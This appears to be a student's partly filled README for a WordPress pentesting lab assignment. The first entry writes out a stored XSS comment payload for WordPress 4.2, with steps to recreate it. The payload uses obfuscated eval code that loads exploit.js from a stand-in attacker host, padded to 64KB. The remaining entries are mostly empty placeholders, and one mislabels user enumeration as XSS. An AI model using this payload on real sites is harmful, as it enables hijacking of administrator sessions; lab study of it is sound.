# Week7CyberSecurity

# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total
Started:  3:10pm 4/10/18 stopped at 10:00PM 4/10/18
Started:  1:50pm 4/11:18 stopped at 

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Vulnerability 7945
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: REFER TO FirstExploit
  - [ ] Steps to recreate:
  I went to a location where I could leave a comment then pasted <a title='xxx onmouseover=eval(unescape(/var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.setAttribute%28%27src%27%2C%27https%3A%2f%2fattacker.site%2fexploit.js%27%29%3Bdocument.head.appendChild%28a%29/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
and I went to http://bytesizematters.com/ and typed out more than 64KB of the character "A", Then I copied it and pasted it 
into the Comment box afterwards I posted the comment. Sign into admin and viewed Network tab under developer tools for exploit
  - [ ] Affected source code:
    - [Link 1](https://klikki.fi/adv/wordpress2.html)

1.  Vulnerability User Enumeration
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.7.5
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

1. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version: 4.2
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Physically installing the application was a challenge. Next is using WordPress for the first time.
## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
